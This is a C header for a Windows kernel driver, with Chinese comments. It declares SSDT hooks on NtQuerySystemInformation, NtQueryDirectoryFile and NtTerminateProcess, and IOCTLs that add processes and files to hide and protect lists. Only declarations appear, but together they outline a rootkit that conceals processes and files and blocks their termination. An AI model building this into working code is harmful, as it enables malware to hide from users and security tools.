#ifndef __SSDT_01_H__
#define __SSDT_01_H__

#ifndef _WIN32_WINNT				// Allow use of features specific to Windows XP or later.                   
#define _WIN32_WINNT 0x0501			// Change this to the appropriate value to target other versions of Windows.
#endif						

#ifdef __cplusplus
extern "C" 
{
#endif


#include "VisualDDKHelpers.h"
#include <ntddk.h>


#ifdef __cplusplus
}
#endif


#include <stdlib.h>
#include "SSDTHook.h"


#define DEVICE_NAME_PROCESS				L"\\Device\\SSDT01ByZachary"
#define SYMBOLINK_NAME_PROCESS			L"\\??\\SSDT01ByZachary"

#define MAX_PROCESS_ARRARY_LENGTH		1024

#define	SSDT01_DEVICE_TYPE				FILE_DEVICE_UNKNOWN

/*
*定义用于应用程序和驱动程序通信的宏，这里使用的是缓冲区读写方式
*/
#define	IO_INSERT_HIDE_PROCESS			(ULONG) CTL_CODE(SSDT01_DEVICE_TYPE, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define	IO_INSERT_HIDE_FILE 			(ULONG) CTL_CODE(SSDT01_DEVICE_TYPE, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define	IO_INSERT_PROTECT_PROCESS		(ULONG) CTL_CODE(SSDT01_DEVICE_TYPE, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)


typedef struct _SYSTEM_THREAD_INFORMATION 
{
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	KPRIORITY Priority;
	LONG BasePriority;
	ULONG ContextSwitches;
	ULONG ThreadState;
	ULONG WaitReason;

} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;


typedef struct _SYSTEM_PROCESS_INFORMATION 
{
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER SpareLi1;
	LARGE_INTEGER SpareLi2;
	LARGE_INTEGER SpareLi3;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE UniqueProcessId;
	HANDLE InheritedFromUniqueProcessId;
	ULONG HandleCount;
	ULONG SessionId;
	ULONG_PTR PageDirectoryBase;
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	LARGE_INTEGER ReadTransferCount;
	LARGE_INTEGER WriteTransferCount;
	LARGE_INTEGER OtherTransferCount;

} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;


typedef enum _SYSTEM_INFORMATION_CLASS 
{
	SystemBasicInformation,
	SystemProcessorInformation,
	SystemPerformanceInformation,
	SystemTimeOfDayInformation,
	SystemPathInformation,
	SystemProcessInformation,
	SystemCallCountInformation,
	SystemDeviceInformation,
	SystemProcessorPerformanceInformation,
	SystemFlagsInformation,
	SystemCallTimeInformation,
	SystemModuleInformation,
	SystemLocksInformation,
	SystemStackTraceInformation,
	SystemPagedPoolInformation,
	SystemNonPagedPoolInformation,
	SystemHandleInformation,
	SystemObjectInformation,
	SystemPageFileInformation,
	SystemVdmInstemulInformation,
	SystemVdmBopInformation,
	SystemFileCacheInformation,
	SystemPoolTagInformation,
	SystemInterruptInformation,
	SystemDpcBehaviorInformation,
	SystemFullMemoryInformation,
	SystemLoadGdiDriverInformation,
	SystemUnloadGdiDriverInformation,
	SystemTimeAdjustmentInformation,
	SystemSummaryMemoryInformation,
	SystemMirrorMemoryInformation,
	SystemPerformanceTraceInformation,
	SystemObsolete0,
	SystemExceptionInformation,
	SystemCrashDumpStateInformation,
	SystemKernelDebuggerInformation,
	SystemContextSwitchInformation,
	SystemRegistryQuotaInformation,
	SystemExtendServiceTableInformation,
	SystemPrioritySeperation,
	SystemVerifierAddDriverInformation,
	SystemVerifierRemoveDriverInformation,
	SystemProcessorIdleInformation,
	SystemLegacyDriverInformation,
	SystemCurrentTimeZoneInformation,
	SystemLookasideInformation,
	SystemTimeSlipNotification,
	SystemSessionCreate,
	SystemSessionDetach,
	SystemSessionInformation,
	SystemRangeStartInformation,
	SystemVerifierInformation,
	SystemVerifierThunkExtend,
	SystemSessionProcessInformation,
	SystemLoadGdiDriverInSystemSpace,
	SystemNumaProcessorMap,
	SystemPrefetcherInformation,
	SystemExtendedProcessInformation,
	SystemRecommendedSharedDataAlignment,
	SystemComPlusPackage,
	SystemNumaAvailableMemory,
	SystemProcessorPowerInformation,
	SystemEmulationBasicInformation,
	SystemEmulationProcessorInformation,
	SystemExtendedHandleInformation,
	SystemLostDelayedWriteInformation,
	SystemBigPoolInformation,
	SystemSessionPoolTagInformation,
	SystemSessionMappedViewInformation,
	SystemHotpatchInformation,
	SystemObjectSecurityMode,
	SystemWatchdogTimerHandler,
	SystemWatchdogTimerInformation,
	SystemLogicalProcessorInformation,
	SystemWow64SharedInformation,
	SystemRegisterFirmwareTableInformationHandler,
	SystemFirmwareTableInformation,
	SystemModuleInformationEx,
	SystemVerifierTriageInformation,
	SystemSuperfetchInformation,
	SystemMemoryListInformation,
	SystemFileCacheInformationEx,
	MaxSystemInfoClass

} SYSTEM_INFORMATION_CLASS;

/*
*
*ZwQuerySystemInformation 原型及其Hook函数相关声明
*
*/
NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation (
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__out_bcount_opt(SystemInformationLength) PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);

NTSTATUS HookNtQuerySystemInformation(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__out_bcount_opt(SystemInformationLength) PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);

typedef NTSTATUS(*NTQUERYSYSTEMINFORMATION)(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__out_bcount_opt(SystemInformationLength) PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);

NTQUERYSYSTEMINFORMATION pOldNtQuerySystemInformation;

/*
*
*ZwQueryDirectoryFile 原型及其Hook函数声明
*
*/

NTSYSAPI NTSTATUS NTAPI ZwQueryDirectoryFile(
__in HANDLE FileHandle,
__in_opt HANDLE Event ,
__in_opt PIO_APC_ROUTINE ApcRoutine ,
__in_opt PVOID ApcContext ,
__out PIO_STATUS_BLOCK IoStatusBlock,
__out PVOID FileInformation,
__in ULONG Length,
__in FILE_INFORMATION_CLASS FileInformationClass,
__in BOOLEAN ReturnSingleEntry,
__in_opt PUNICODE_STRING FileName ,
__in BOOLEAN RestartScan
);



NTSTATUS HookNtQueryDirectoryFile(
	__in     HANDLE                 FileHandle,
	__in_opt HANDLE                 Event,
	__in_opt PIO_APC_ROUTINE        ApcRoutine,
	__in_opt PVOID                  ApcContext,
	__out    PIO_STATUS_BLOCK       IoStatusBlock,
	__out    PVOID                  FileInformation,
	__in     ULONG                  Length,
	__in     FILE_INFORMATION_CLASS FileInformationClass,
	__in     BOOLEAN                ReturnSingleEntry,
	__in_opt PUNICODE_STRING        FileName,
	__in     BOOLEAN                RestartScan
	);


typedef NTSTATUS(*NTQUERYDIRECTORYFILE)(
	__in  HANDLE FileHandle,
	__in_opt  HANDLE Event ,
	__in_opt  PIO_APC_ROUTINE ApcRoutine ,
	__in_opt  PVOID ApcContext ,
	__out PIO_STATUS_BLOCK IoStatusBlock,
	__out PVOID FileInformation,
	__in  ULONG Length,
	__in  FILE_INFORMATION_CLASS FileInformationClass,
	__in  BOOLEAN ReturnSingleEntry,
	__in_opt  PUNICODE_STRING FileName ,
	__in  BOOLEAN RestartScan
	);

NTQUERYDIRECTORYFILE pOldNtQueryDirectoryFile;


typedef struct _FILE_BOTH_DIR_INFORMATION {
	ULONG NextEntryOffset;
	ULONG FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG FileAttributes;
	ULONG FileNameLength;
	ULONG EaSize;
	CCHAR ShortNameLength;
	WCHAR ShortName[12];
	WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *pFILE_BOTH_DIR_INFORMATION;

/*
*
*NTTERMINATEPROCESS 原型及其Hook函数声明
*
*/

typedef NTSTATUS (* NTTERMINATEPROCESS)(
	__in_opt HANDLE ProcessHandle,
	__in NTSTATUS ExitStatus
	);

NTSTATUS HookNtTerminateProcess(
	__in_opt HANDLE ProcessHandle,
	__in NTSTATUS ExitStatus
	);

NTTERMINATEPROCESS pOldNtTerminateProcess;

PUCHAR PsGetProcessImageFileName(__in PEPROCESS Process);



/*
*
*进程保护成员存储容器
*
*/

ULONG g_PIDHideArray[MAX_PROCESS_ARRARY_LENGTH];
ULONG g_PIDProtectArray[MAX_PROCESS_ARRARY_LENGTH];
UNICODE_STRING  g_FileHideArray[MAX_PROCESS_ARRARY_LENGTH];

ULONG g_currHideArrayLen = 0;
ULONG g_currProtectArrayLen = 0;
ULONG g_currFileArrayLen = 0;

/*
*
*验证FileName 是否存在于隐藏文件列表中
*
*/
ULONG  ValidateFileNeedHide(UNICODE_STRING  FileName);



//验证 uPID 所代表的进程是否存在于隐藏进程列表中
ULONG ValidateProcessNeedHide(ULONG uPID);


//验证 uPID 所代表的进程是否存在于保护进程列表中

ULONG ValidateProcessNeedProtect(ULONG uPID);

/*
*
*向隐藏文件列表中插入Filename
*
*/
ULONG InsertHideFile(ULONG FileName);

//往隐藏进程列表中插入 uPID
ULONG InsertHideProcess(ULONG uPID);


//往保护进程列表中插入 uPID
ULONG InsertProtectProcess(ULONG uPID);




void SSDT01DriverUnload(IN PDRIVER_OBJECT pDriverObject);

NTSTATUS SSDT01CreateDispatcher(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);

NTSTATUS SSDT01CloseDispatcher(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);

NTSTATUS SSDT01GeneralDispatcher(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);

NTSTATUS SSDT01ReadDispatcher(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);

NTSTATUS SSDT01WriteDispatcher(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);

NTSTATUS SSDT01DeviceIoControlDispatcher(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);


#ifdef __cplusplus
extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING  pRegistryPath);
#endif


#endif